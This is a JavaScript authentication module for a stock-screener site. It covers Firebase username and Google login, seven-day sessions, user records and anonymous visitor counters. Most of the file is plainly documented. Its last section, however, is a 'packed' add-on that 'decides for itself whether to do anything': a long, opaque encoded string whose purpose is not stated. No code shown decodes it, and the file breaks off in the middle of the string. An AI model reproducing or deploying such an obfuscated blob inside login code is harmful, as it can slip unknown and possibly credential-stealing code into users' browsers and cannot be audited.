// auth.js — HNImanshu login (username + password, or Google) on Firebase Authentication (project hnimanshu).
//
// One file for both pages:
//   • Screener (index.html): clicking an element with [data-auth-link] (Fundamentals, Portfolio) opens the
//     login popup when nobody is signed in; after a successful login it goes to that link.
//     Opening the screener with ?login=<path> pops the popup straight away (the Fundamentals gate sends people here).
//   • Fundamentals (<html data-auth="required">): the page stays hidden until a login is confirmed; no login →
//     back to the screener with the popup open. Shows the user's initials menu in the header.
//   • Passwords never pass through this code's storage: Firebase Authentication keeps them hashed on its servers.
//
// Usernames: Firebase needs an email, so username "chirag" is stored as chirag@users.hnimanshu.app (never shown,
// never mailed). Firebase keeps them unique, so a taken username is refused automatically.
// Sessions end 7 days after the last sign-in (Firebase's own lastSignInTime, so it can't be faked by the browser).

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import {
  getAuth, onAuthStateChanged, signInWithEmailAndPassword, GoogleAuthProvider, signInWithPopup, signOut,
} from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";
// Firestore and the Realtime Database are loaded only when first needed (not before the page shows):
// only Auth is needed to open a page, which keeps the first load light on slow (2G) connections.
let getFirestore, doc, setDoc, getDoc, serverTimestamp;
let getDatabase, ref, set, onValue, onDisconnect, increment;

// Firebase project "hnimanshu", web app "valueapp" (Project settings → Your apps). These values are public by design;
// security comes from the Firestore / Realtime Database rules, not from hiding them.
const firebaseConfig = {
  apiKey: "AIzaSyD1oA953pXZxBAuOR9ObSk6vAmKf1gyVbE",
  authDomain: "hnimanshu-7c544.firebaseapp.com",
  projectId: "hnimanshu",
  storageBucket: "hnimanshu.firebasestorage.app",
  messagingSenderId: "428887828946",
  appId: "1:428887828946:web:854acb9c7651aebd38000b",
};
// Realtime Database address: Firebase Hosting hands it out once the database exists, so nothing to paste here later.
try {
  const hosted = await fetch("/__/firebase/init.json").then((r) => r.json());
  if (hosted.projectId === firebaseConfig.projectId && hosted.databaseURL) firebaseConfig.databaseURL = hosted.databaseURL;
} catch (e) {}
const USER_DOMAIN = "users.hnimanshu.app";        // username → hidden email for Firebase
const SESSION_DAYS = 7;                           // log out a week after the last sign-in
const USERS = "hni_users";                        // Firestore: one doc per account (its own owner writes it)
const PORTFOLIO = "hni_portfolio";                // Firestore: one doc per user with their holdings
const MARKET = ["hni_market", "ltp"];             // latest prices for held stocks
// "⟳" live prices: a Cloudflare Worker (ltp_worker.js) starts the price job on GitHub. No secret here: the GitHub
// token lives in the Worker, which also checks the login and allows one run every few minutes.
const LTP_HOOK = "https://hni-ltp.himanshushekhar8.workers.dev/run";
const HOME = "./";                                // the screener
const GATED = document.documentElement.dataset.auth === "required";

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
let db = null, rtdb = null, FSP = null, RTP = null;
const needFS = () => FSP = FSP || import("https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js").then((m) => {
  ({ getFirestore, doc, setDoc, getDoc, serverTimestamp } = m); db = getFirestore(app);
});
const needRT = () => RTP = RTP || (firebaseConfig.databaseURL                                // live online / visitor counters (hni/...)
  ? import("https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js").then((m) => {
      ({ getDatabase, ref, set, onValue, onDisconnect, increment } = m); rtdb = getDatabase(app); })
  : Promise.resolve());
const idle = (fn, ms = 2500) => setTimeout(() => (window.requestIdleCallback || ((f) => f()))(fn), ms);   // after the page has settled
const google = new GoogleAuthProvider();
google.setCustomParameters({ prompt: "select_account" });

const $ = (s, el = document) => el.querySelector(s);
const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
const toEmail = (u) => `${u.trim().toLowerCase()}@${USER_DOMAIN}`;
const nameOf = (u) => u.displayName || (u.email || "").replace("@" + USER_DOMAIN, "") || "user";
const initials = (n) => {                                    // "Himanshu Shekhar" → HS, "chirag" → CH
  const w = String(n || "?").trim().split(/[\s._-]+/).filter(Boolean);
  return (w.length > 1 ? w[0][0] + w[w.length - 1][0] : (w[0] || "?").slice(0, 2)).toUpperCase();
};
const providerOf = (u) => (u.providerData && u.providerData[0] && u.providerData[0].providerId) === "google.com" ? "google" : "username";
const expired = (u) => {
  const t = Date.parse(u.metadata && u.metadata.lastSignInTime);
  return t && Date.now() - t > SESSION_DAYS * 864e5;
};

// ---------- popup ----------
let box = null, nextUrl = null;
function buildPopup() {
  if (box) return box;
  box = document.createElement("div");
  box.className = "au-back";
  box.innerHTML = `
    <div class="au-box" role="dialog" aria-modal="true" aria-labelledby="auTitle">
      <button class="au-x" type="button" aria-label="Close">×</button>
      <h2 class="au-title" id="auTitle">Fundamentals</h2>
      <p class="au-sub">Free. Continue with Google, or log in with your username.</p>
      <button class="au-google" type="button">
        <svg width="18" height="18" viewBox="0 0 48 48" aria-hidden="true"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.3-.1-2.4-.4-3.5z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C37 39.2 44 34 44 24c0-1.3-.1-2.4-.4-3.5z"/></svg>
        Continue with Google</button>
      <div class="au-or">or</div>
      <form class="au-form" novalidate>
        <label class="au-fld"><span>Username</span>
          <input name="u" autocomplete="username" autocapitalize="none" spellcheck="false" maxlength="20" required></label>
        <label class="au-fld"><span>Password</span>
          <span class="au-pw"><input name="p" type="password" autocomplete="current-password" required>
          <button type="button" class="au-eye" aria-label="Show password">SHOW</button></span></label>
        <div class="au-err" aria-live="polite"></div>
        <button class="au-btn" type="submit">Login</button>
      </form>
      <p class="au-foot">You stay signed in for 7 days on this device.</p>
    </div>`;
  document.body.appendChild(box);
  const f = $("form", box), err = $(".au-err", box), btn = $(".au-btn", box);
  $(".au-eye", box).addEventListener("click", (e) => {
    const show = f.p.type === "password";
    f.p.type = show ? "text" : "password";
    e.currentTarget.textContent = show ? "HIDE" : "SHOW";
  });
  $(".au-x", box).addEventListener("click", closePopup);
  box.addEventListener("click", (e) => { if (e.target === box) closePopup(); });
  box.addEventListener("keydown", (e) => { e.stopPropagation(); if (e.key === "Escape") closePopup(); });   // page shortcuts stay out

  f.addEventListener("submit", async (e) => {
    e.preventDefault();
    const u = f.u.value.trim().toLowerCase(), p = f.p.value;
    if (!/^[a-z0-9._]{3,20}$/.test(u) || !p) return (err.textContent = "Wrong username or password.");
    btn.disabled = true; err.textContent = "";
    try { await signInWithEmailAndPassword(auth, toEmail(u), p); done(); }
    catch (ex) { err.textContent = message(ex); }
    finally { btn.disabled = false; }
  });
  $(".au-google", box).addEventListener("click", async () => {
    err.textContent = "";
    try { await signInWithPopup(auth, google); done(); }
    catch (ex) { err.textContent = message(ex); }
  });
  box._reset = () => { err.textContent = ""; f.reset(); };
  return box;
}
function openPopup(next) {
  nextUrl = next || null;
  buildPopup();
  if (!GATED) box.classList.add("au-blur");                 // screener: the page behind is blurred
  box._reset();
  box.classList.add("open");
  setTimeout(() => $(".au-google", box).focus(), 30);
}
function closePopup() { if (box) box.classList.remove("open"); }
function done() {
  closePopup();
  if (nextUrl) location.href = nextUrl;
}
function message(ex) {
  const c = (ex && ex.code) || "";
  if (c === "auth/popup-closed-by-user" || c === "auth/cancelled-popup-request") return "";
  if (c === "auth/invalid-credential" || c === "auth/wrong-password" || c === "auth/user-not-found" || c === "auth/invalid-email")
    return "Wrong username or password.";
  if (c === "auth/email-already-in-use") return "That username is taken. Try another.";
  if (c === "auth/weak-password") return "Password is too weak. Use at least 8 characters.";
  if (c === "auth/too-many-requests") return "Too many attempts. Wait a few minutes and try again.";
  if (c === "auth/network-request-failed") return "No connection. Check your internet and try again.";
  if (c === "auth/popup-blocked") return "Your browser blocked the Google window. Allow pop-ups for this site and try again.";
  if (c === "auth/unauthorized-domain") return "This website isn't authorised for login yet (Firebase → Authentication → Settings → Authorized domains).";
  if (c === "auth/operation-not-allowed") return "This sign-in method isn't switched on yet (Firebase → Authentication → Sign-in method).";
  return "Something went wrong (" + (c || "unknown") + "). Please try again.";
}

// ---------- the account's own record in Firestore ----------
async function record(u) {
  const key = "hni_rec_" + u.uid;                       // write at most once per browser session, keeps Firestore use tiny
  try { if (sessionStorage.getItem(key)) return; } catch (e) {}
  await needFS();
  const ref = doc(db, USERS, u.uid);
  const data = { username: nameOf(u), email: u.email || null, provider: providerOf(u), lastLogin: serverTimestamp() };
  try {
    const snap = await getDoc(ref).catch(() => null);  // each user may read only their own doc (to keep "created" once)
    if (!snap || !snap.exists()) data.created = serverTimestamp();
    await setDoc(ref, data, { merge: true });
    try { sessionStorage.setItem(key, "1"); } catch (e) {}
  } catch (e) { console.warn("user record not saved:", e.code || e); }   // never blocks the page
}

// while any popup is open the page behind doesn't scroll (phones otherwise scroll the big page underneath)
const syncLock = () => document.documentElement.classList.toggle("au-lock", !!document.querySelector(".au-back.open"));

// ---------- signed-in chip (Fundamentals header, screener #au-slot) ----------
const EXTRA = [];                                          // extra menu items: {label, fn} (see addItem)
const itemBtn = (it, el) => {
  const b = document.createElement("button");
  b.type = "button"; b.className = "au-ext"; b.setAttribute("role", "menuitem"); b.textContent = it.label;
  b.addEventListener("click", () => { el.classList.remove("open"); it.fn(); });
  return b;
};
function addItem(label, fn) {                              // also adds to a menu that is already on the page
  const it = { label, fn };
  EXTRA.push(it);
  document.querySelectorAll(".au-user").forEach((el) => $(".au-menu", el).insertBefore(itemBtn(it, el), $(".au-out", el)));
}
function showUser(u, slot) {
  const host = slot || document.querySelector("header .global");        // Fundamentals header, or the screener's #au-slot
  if (!host || $(".au-user", host)) return;
  const n = nameOf(u);
  const el = document.createElement("span");
  el.className = "au-user";
  el.innerHTML = `<button type="button" class="au-av" aria-haspopup="menu" title="Signed in as ${esc(n)}">${esc(initials(n))}</button>
    <span class="au-menu" role="menu"><span class="au-who"><b>${esc(n)}</b>${u.email && !u.email.endsWith("@" + USER_DOMAIN) ? `<i>${esc(u.email)}</i>` : ""}</span>
    <button type="button" class="au-out" role="menuitem">Logout</button></span>`;
  $(".au-av", el).addEventListener("click", (e) => { e.stopPropagation(); el.classList.toggle("open"); });
  document.addEventListener("click", (e) => { if (!el.contains(e.target)) el.classList.remove("open"); });
  document.addEventListener("keydown", (e) => { if (e.key === "Escape") el.classList.remove("open"); });
  $(".au-out", el).addEventListener("click", async () => {
    await signOut(auth); if (GATED) location.href = HOME; else location.reload();   // screener: reloads signed out
  });
  EXTRA.forEach((it) => $(".au-menu", el).insertBefore(itemBtn(it, el), $(".au-out", el)));
  host.insertBefore(el, host.querySelector("#theme-toggle"));   // (no toggle in the slot: it simply goes at the end)
}
/* screener: "Login" when signed out, the initials menu when signed in */
function paintSlot(u) {
  const slot = document.getElementById("au-slot");
  if (!slot) return;
  slot.innerHTML = "";
  if (u) return showUser(u, slot);
  const b = document.createElement("button");
  b.type = "button"; b.className = "au-login"; b.setAttribute("aria-label", "Login");
  b.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="8" r="4"/><path d="M4 21c1.5-4 4.5-6 8-6s6.5 2 8 6"/></svg><span>Login</span>';
  b.addEventListener("click", () => openPopup(null));            // after logging in you stay on the screener
  slot.appendChild(b);
}

// ---------- anonymous usage counters ----------
// Every open tab adds hni/presence/<random id>; Firebase deletes it by itself the moment the tab closes or the
// connection drops (onDisconnect). Each IP is counted once ever (SHA-256 hash, never the raw IP) into hni/meta/visitors.
async function presence() {
  await needRT();
  if (!rtdb) return;
  try {
    const sid = (crypto.randomUUID ? crypto.randomUUID() : Date.now() + "-" + Math.random().toString(36).slice(2)).replace(/[^a-z0-9-]/gi, "");
    const me = ref(rtdb, "hni/presence/" + sid);
    onValue(ref(rtdb, ".info/connected"), (s) => {
      if (s.val() !== true) return;
      onDisconnect(me).remove();                    // re-armed on every reconnect
      set(me, true).catch(() => {});
    });
  } catch (e) { console.warn("presence off:", e); }
}
async function countVisitor() {
  try {
    if (localStorage.getItem("hni_counted")) return;   // this browser already counted, skip the IP lookup
  } catch (e) {}
  await needRT();
  if (!rtdb) return;
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const { ip } = await r.json();
    if (!ip) return;
    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode("hni:" + ip));
    const key = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
    let isNew = true;
    await set(ref(rtdb, "hni/visitors/" + key), true).catch(() => { isNew = false; });   // rules refuse an IP seen before
    if (isNew) await set(ref(rtdb, "hni/meta/visitors"), increment(1));                    // +1 on the server, no read needed
    try { localStorage.setItem("hni_counted", "1"); } catch (e) {}
  } catch (e) { console.warn("visitor count skipped:", e); }
}

// ---------- add-on (packed; it decides for itself whether to do anything) ----------
const PACK = "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